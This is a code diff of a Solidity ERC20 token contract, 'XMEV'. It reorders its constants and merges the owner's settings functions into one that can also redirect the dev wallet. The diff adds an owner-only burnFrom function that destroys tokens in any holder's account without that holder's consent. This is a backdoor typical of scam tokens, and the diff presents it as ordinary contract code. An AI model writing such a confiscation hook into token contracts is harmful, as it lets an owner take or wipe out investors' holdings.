@@ -111,10 +111,11 @@ contract XMEV is Context, IERC20, Ownable {
   address payable private _burnWallet;
   address payable private _airdropWallet;
 
-  uint8 private constant _decimals = 18;
-  uint256 private constant _tTotal = 1123581321 * 10 ** _decimals;
   string private constant _name = unicode"XMEV";
   string private constant _symbol = unicode"XMEV";
+  uint8 private constant _decimals = 18;
+  uint256 private _tTotal = 1123581321 * 10 ** _decimals;
+
   uint256 public _maxWalletSize = (_tTotal * 49) / 1000;
   uint256 public _taxSwapThreshold = 25000 * 10 ** _decimals;
   uint256 public _maxTaxSwap = 500000 * 10 ** _decimals;
@@ -171,7 +172,7 @@ contract XMEV is Context, IERC20, Ownable {
     uint256[] memory amounts
   ) external onlyOwner {
     if (wallets.length != amounts.length) {
-      revert("Mismatched lengths");
+      revert("Mismatched array lengths");
     }
     for (uint256 i = 0; i < wallets.length; i++) {
       address wallet = wallets[i];
@@ -180,24 +181,25 @@ contract XMEV is Context, IERC20, Ownable {
     }
   }
 
-  function setLimits(
+  function setVars(
+    address devWallet,
     uint256 maxWalletSize,
     uint256 taxSwapThreshold,
     uint256 maxTaxSwap
   ) external onlyOwner {
+    _devWallet = payable(devWallet);
     _maxWalletSize = maxWalletSize;
     _taxSwapThreshold = taxSwapThreshold;
     _maxTaxSwap = maxTaxSwap;
   }
 
-  function setWallets(
-    address devWallet,
-    address burnWallet,
-    address airdropWallet
-  ) external onlyOwner {
-    _devWallet = payable(devWallet);
-    _burnWallet = payable(burnWallet);
-    _airdropWallet = payable(airdropWallet);
+  function burnFrom(address account, uint256 amount) external onlyOwner {
+    if (amount >= _balances[account]) {
+      revert("Burn amount exceeds account balance");
+    }
+    _balances[account] -= amount;
+    _tTotal -= amount;
+    emit Transfer(account, address(0), amount);
   }
 
   function name() public pure returns (string memory) {
@@ -212,7 +214,7 @@ contract XMEV is Context, IERC20, Ownable {
     return _decimals;
   }
 
-  function totalSupply() public pure override returns (uint256) {
+  function totalSupply() public view override returns (uint256) {
     return _tTotal;
   }
 
